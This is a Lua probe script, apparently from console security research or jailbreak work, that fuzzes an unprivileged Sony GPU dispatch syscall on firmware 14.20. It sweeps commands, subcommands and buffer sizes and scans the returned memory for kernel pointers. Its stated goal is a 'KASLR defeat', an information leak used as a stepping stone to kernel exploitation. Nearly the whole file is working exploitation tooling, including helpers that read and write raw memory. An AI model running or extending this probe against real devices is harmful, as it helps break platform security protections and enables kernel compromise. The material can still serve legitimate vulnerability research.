-- CRASH_CLASS: MODERATE
-- PROBE 221a: sys 532 GPU dispatch — cmd 0x20 config query + 8 other unprivileged cmds
--
-- Context: Deep handler analysis (sys_532_deep.md) reveals:
--   sys 532 = primary Sony GPU/compute dispatch (~70+ sub-ops, ~16KB handler)
--   Args: cmd(u32 arg0), subcmd(u32 arg1), output_ptr(u64 arg2),
--          input_ptr(u64 arg3), size(u64 arg4)
--   When priv_check(td, 0x2aa) FAILS (we are unprivileged), 9 commands bypass:
--     0x18-0x1E (7 commands, range check: [cmd-0x18] < 7)
--     0x20 (config query — fixed 0x30-byte copyin, 48B output = potential KASLR)
--     0x2F (additional bypass)
--   Stack frame: 0x858 bytes, local buffer 0x818 bytes
--
-- NEVER TESTED on any firmware. First-ever sys 532 test on 14.20.
--
-- Section A: Enumerate all 9 unprivileged commands + 3 privileged for comparison
-- Section B: cmd 0x20 deep analysis — 48-byte output kernel pointer scan
-- Section C: cmd 0x18-0x1E with subcmd sweep + output scan
-- Section D: Error code taxonomy + privileged command rejection verification

local TEST_SECTION = TEST_SECTION or "A"

print("=== PROBE 221a: GPU DISPATCH CMD 0x20 KASLR HUNT ===")
print("Section: " .. TEST_SECTION)
print("Firmware: 14.20")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end
local function is_kptr(val)
    local h, l = get_hi_lo(val)
    if h >= 0xFFFF8000 and h <= 0xFFFFFFFE then return true end
    return false
end
local function hexdump_qwords(base, size, label)
    local found = 0
    for off = 0, size - 8, 8 do
        local val = safe_rq(base + off)
        if val then
            local h, l = get_hi_lo(val)
            if h ~= 0 or l ~= 0 then
                local tag = ""
                if is_kptr(val) then
                    tag = " *** KERNEL POINTER ***"
                    found = found + 1
                end
                print(string.format("  %s +0x%02X = %s%s", label, off, fmt(val), tag))
            end
        end
    end
    return found
end

local sc532 = make_syscall(532)
local sc624 = make_syscall(624)
local sc20  = make_syscall(20)

print("pid=" .. to_num(sc20()))
local vm_base = to_num(sc624())
print("vm_timestamp_baseline=" .. vm_base)

if TEST_SECTION == "A" then
    print("--- Section A: Enumerate unprivileged commands ---")
    print("  Bypasses priv_check: 0x18-0x1E, 0x20, 0x2F")
    print("")

    local outbuf = memory.alloc(0x1000)
    local inbuf  = memory.alloc(0x1000)
    local out_addr = outbuf
    local in_addr  = inbuf

    -- Zero both buffers
    for i = 0, 0xFFF, 4 do
        pcall(function() memory.write_dword(out_addr + i, 0) end)
        pcall(function() memory.write_dword(in_addr + i, 0) end)
    end

    -- Test each unprivileged command
    local unpriv_cmds = {0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x20, 0x2F}
    -- Also test 3 privileged commands for comparison
    local priv_cmds = {0x00, 0x01, 0x10}

    print("=== UNPRIVILEGED COMMANDS ===")
    for _, cmd in ipairs(unpriv_cmds) do
        -- Zero output buffer before each test
        for i = 0, 0xFF, 4 do pcall(function() memory.write_dword(out_addr + i, 0) end) end

        -- sys 532(cmd, subcmd=0, output_ptr, input_ptr, size)
        -- For cmd 0x20: size should be 0x30 (48 bytes, fixed copyin)
        -- For others: try size 0x100
        local size = (cmd == 0x20) and 0x30 or 0x100

        local ok, rv = pcall(function()
            return sc532(cmd, 0, out_addr, in_addr, size)
        end)
        local rv_str = ok and fmt(rv) or tostring(rv)

        -- Check if output buffer was modified
        local out_modified = false
        for i = 0, 0x3F, 4 do
            local v = safe_rd(out_addr + i)
            if v and v ~= 0 then out_modified = true; break end
        end

        print(string.format("  cmd=0x%02X subcmd=0 size=0x%X: ok=%s rv=%s output_modified=%s",
            cmd, size, tostring(ok), rv_str, tostring(out_modified)))

        if out_modified then
            local kptrs = hexdump_qwords(out_addr, math.min(size, 0x100), string.format("cmd0x%02X", cmd))
            if kptrs > 0 then
                print(string.format("  *** %d KERNEL POINTER(S) IN CMD 0x%02X OUTPUT ***", kptrs, cmd))
            end
        end
    end

    print("")
    print("=== PRIVILEGED COMMANDS (should be rejected) ===")
    for _, cmd in ipairs(priv_cmds) do
        for i = 0, 0xFF, 4 do pcall(function() memory.write_dword(out_addr + i, 0) end) end
        local ok, rv = pcall(function()
            return sc532(cmd, 0, out_addr, in_addr, 0x100)
        end)
        print(string.format("  cmd=0x%02X: ok=%s rv=%s", cmd, tostring(ok), ok and fmt(rv) or tostring(rv)))
    end

    print("")
    local vm_end = to_num(sc624())
    print("vm_timestamp_delta=" .. (vm_end - vm_base))
    print("[DONE] Section A complete")

elseif TEST_SECTION == "B" then
    print("--- Section B: cmd 0x20 deep analysis — 48-byte config output ---")
    print("")

    local outbuf = memory.alloc(0x1000)
    local inbuf  = memory.alloc(0x1000)
    local out_addr = outbuf
    local in_addr  = inbuf

    -- Test 1: cmd 0x20 with subcmd=0, size=0x30 (expected by handler)
    print("[TEST 1] cmd=0x20 subcmd=0 size=0x30")
    for i = 0, 0xFF, 4 do pcall(function() memory.write_dword(out_addr + i, 0) end) end
    for i = 0, 0xFF, 4 do pcall(function() memory.write_dword(in_addr + i, 0) end) end

    local ok1, rv1 = pcall(function()
        return sc532(0x20, 0, out_addr, in_addr, 0x30)
    end)
    print("  ok=" .. tostring(ok1) .. " rv=" .. (ok1 and fmt(rv1) or tostring(rv1)))

    -- Full byte-level dump of 48-byte output
    print("  Output (48 bytes, qword-aligned):")
    local kptrs1 = hexdump_qwords(out_addr, 0x30, "output")

    -- Also dump as dwords for finer granularity
    print("  Output (dwords):")
    for off = 0, 0x2C, 4 do
        local v = safe_rd(out_addr + off)
        if v then
            print(string.format("    +0x%02X = 0x%08X", off, v))
        end
    end

    -- Test 2: cmd 0x20 with different subcmd values
    print("")
    print("[TEST 2] cmd=0x20 subcmd sweep (0, 1, 2, 0xFF)")
    for _, subcmd in ipairs({0, 1, 2, 0xFF, 0x100, 0xFFFF}) do
        for i = 0, 0x3F, 4 do pcall(function() memory.write_dword(out_addr + i, 0) end) end
        local ok, rv = pcall(function()
            return sc532(0x20, subcmd, out_addr, in_addr, 0x30)
        end)
        local modified = false
        for i = 0, 0x2F, 4 do
            local v = safe_rd(out_addr + i)
            if v and v ~= 0 then modified = true; break end
        end
        print(string.format("  subcmd=0x%X: ok=%s rv=%s modified=%s",
            subcmd, tostring(ok), ok and fmt(rv) or "err", tostring(modified)))
    end

    -- Test 3: cmd 0x20 with size variations
    print("")
    print("[TEST 3] cmd=0x20 size sensitivity")
    for _, sz in ipairs({0, 0x10, 0x20, 0x30, 0x40, 0x100, 0x800, 0x818}) do
        for i = 0, 0xFF, 4 do pcall(function() memory.write_dword(out_addr + i, 0) end) end
        local ok, rv = pcall(function()
            return sc532(0x20, 0, out_addr, in_addr, sz)
        end)
        print(string.format("  size=0x%X: ok=%s rv=%s", sz, tostring(ok),
            ok and fmt(rv) or tostring(rv)))
    end

    -- Test 4: cmd 0x20 with null input_ptr (no copyin needed for query?)
    print("")
    print("[TEST 4] cmd=0x20 with input_ptr=0 (null copyin)")
    for i = 0, 0x3F, 4 do pcall(function() memory.write_dword(out_addr + i, 0) end) end
    local ok4, rv4 = pcall(function()
        return sc532(0x20, 0, out_addr, 0, 0x30)
    end)
    print("  ok=" .. tostring(ok4) .. " rv=" .. (ok4 and fmt(rv4) or tostring(rv4)))
    local kptrs4 = hexdump_qwords(out_addr, 0x30, "null_in")

    -- Test 5: Repeat cmd 0x20 to check stability (KASLR = same across calls)
    print("")
    print("[TEST 5] cmd=0x20 stability — 3 consecutive calls")
    local snapshots = {}
    for round = 1, 3 do
        for i = 0, 0x3F, 4 do pcall(function() memory.write_dword(out_addr + i, 0) end) end
        local ok, rv = pcall(function()
            return sc532(0x20, 0, out_addr, in_addr, 0x30)
        end)
        if ok then
            local snap = {}
            for off = 0, 0x28, 8 do
                snap[off] = fmt(safe_rq(out_addr + off))
            end
            snapshots[round] = snap
            print(string.format("  round %d: +0x00=%s +0x08=%s +0x10=%s +0x18=%s +0x20=%s +0x28=%s",
                round, snap[0], snap[8], snap[16], snap[24], snap[32], snap[40]))
        end
    end

    -- Compare snapshots for stability (KASLR pointers should be STABLE across calls)
    if #snapshots >= 2 then
        local stable = true
        for off = 0, 0x28, 8 do
            if snapshots[1][off] ~= snapshots[2][off] then
                stable = false
                print(string.format("  INSTABILITY at +0x%02X: %s vs %s", off,
                    snapshots[1][off], snapshots[2][off]))
            end
        end
        if stable then print("  All values STABLE across calls (consistent with kernel ptrs)") end
    end

    print("")
    print("TOTAL KPTRS found in test 1: " .. kptrs1)
    if kptrs1 > 0 then print("*** KASLR DEFEAT: kernel pointers in GPU config! ***") end

    local vm_end = to_num(sc624())
    print("vm_timestamp_delta=" .. (vm_end - vm_base))
    print("[DONE] Section B complete")

elseif TEST_SECTION == "C" then
    print("--- Section C: cmds 0x18-0x1E with subcmd sweep + output scan ---")
    print("")

    local outbuf = memory.alloc(0x1000)
    local inbuf  = memory.alloc(0x1000)
    local out_addr = outbuf
    local in_addr  = inbuf
    local total_kptrs = 0

    -- Zero input buffer with some test patterns
    for i = 0, 0x817, 4 do pcall(function() memory.write_dword(in_addr + i, 0) end) end

    for cmd = 0x18, 0x1E do
        print(string.format("\n=== CMD 0x%02X ===", cmd))

        -- Subcmd sweep: 0, 1, 2, 0x10, 0x100, 0xFFFF
        for _, subcmd in ipairs({0, 1, 2, 0x10, 0x100}) do
            -- Zero output
            for i = 0, 0xFF, 4 do pcall(function() memory.write_dword(out_addr + i, 0) end) end

            -- cmds 0x1A-0x1D allow size up to 0x819
            local max_size = (cmd >= 0x1A and cmd <= 0x1D) and 0x819 or 0x801
            local test_size = math.min(0x100, max_size)

            local ok, rv = pcall(function()
                return sc532(cmd, subcmd, out_addr, in_addr, test_size)
            end)

            local modified = false
            local first_nonzero = -1
            for i = 0, 0xFF, 4 do
                local v = safe_rd(out_addr + i)
                if v and v ~= 0 then
                    modified = true
                    if first_nonzero < 0 then first_nonzero = i end
                end
            end

            local rv_str = ok and fmt(rv) or tostring(rv)
            print(string.format("  subcmd=0x%X size=0x%X: ok=%s rv=%s modified=%s",
                subcmd, test_size, tostring(ok), rv_str, tostring(modified)))

            if modified then
                local kp = hexdump_qwords(out_addr, 0x100,
                    string.format("cmd0x%02X_sub0x%X", cmd, subcmd))
                total_kptrs = total_kptrs + kp
            end
        end
    end

    -- Also test cmd 0x2F
    print("\n=== CMD 0x2F ===")
    for i = 0, 0xFF, 4 do pcall(function() memory.write_dword(out_addr + i, 0) end) end
    local ok_2f, rv_2f = pcall(function()
        return sc532(0x2F, 0, out_addr, in_addr, 0x100)
    end)
    print(string.format("  subcmd=0 size=0x100: ok=%s rv=%s", tostring(ok_2f),
        ok_2f and fmt(rv_2f) or tostring(rv_2f)))
    local modified_2f = false
    for i = 0, 0xFF, 4 do
        local v = safe_rd(out_addr + i)
        if v and v ~= 0 then modified_2f = true; break end
    end
    if modified_2f then
        total_kptrs = total_kptrs + hexdump_qwords(out_addr, 0x100, "cmd0x2F")
    end

    print("\n=== TOTAL KERNEL POINTERS IN SECTION C: " .. total_kptrs .. " ===")
    if total_kptrs > 0 then
        print("*** KASLR DEFEAT via GPU command output! ***")
    end

    local vm_end = to_num(sc624())
    print("vm_timestamp_delta=" .. (vm_end - vm_base))
    print("[DONE] Section C complete")

elseif TEST_SECTION == "D" then
    print("--- Section D: Error code taxonomy + privileged rejection ---")
    print("")

    local outbuf = memory.alloc(0x1000)
    local inbuf  = memory.alloc(0x1000)
    local out_addr = outbuf
    local in_addr  = inbuf

    for i = 0, 0xFFF, 4 do
        pcall(function() memory.write_dword(out_addr + i, 0) end)
        pcall(function() memory.write_dword(in_addr + i, 0) end)
    end

    -- Sweep ALL command values 0x00-0x40 to map error codes
    print("Command sweep 0x00 - 0x40:")
    local error_map = {}
    for cmd = 0x00, 0x40 do
        local ok, rv = pcall(function()
            return sc532(cmd, 0, out_addr, in_addr, 0x30)
        end)
        local rv_str = ok and fmt(rv) or "pcall_fail"
        if not error_map[rv_str] then error_map[rv_str] = {} end
        table.insert(error_map[rv_str], cmd)
    end

    -- Print grouped by return value
    print("\nGrouped by return value:")
    for rv_str, cmds in pairs(error_map) do
        local cmd_list = {}
        for _, c in ipairs(cmds) do table.insert(cmd_list, string.format("0x%02X", c)) end
        print(string.format("  rv=%s: %s", rv_str, table.concat(cmd_list, ", ")))
    end

    -- Any command with rv=0 and modified output = highest interest
    print("\nRe-checking rv=0 commands for output data:")
    for rv_str, cmds in pairs(error_map) do
        if rv_str == "0x0" then
            for _, cmd in ipairs(cmds) do
                for i = 0, 0xFF, 4 do pcall(function() memory.write_dword(out_addr + i, 0) end) end
                pcall(function() return sc532(cmd, 0, out_addr, in_addr, 0x100) end)
                local has_data = false
                for i = 0, 0xFF, 4 do
                    local v = safe_rd(out_addr + i)
                    if v and v ~= 0 then has_data = true; break end
                end
                if has_data then
                    print(string.format("  cmd=0x%02X has OUTPUT DATA:", cmd))
                    hexdump_qwords(out_addr, 0x100, string.format("cmd0x%02X", cmd))
                end
            end
        end
    end

    local vm_end = to_num(sc624())
    print("vm_timestamp_delta=" .. (vm_end - vm_base))
    print("[DONE] Section D complete")
end
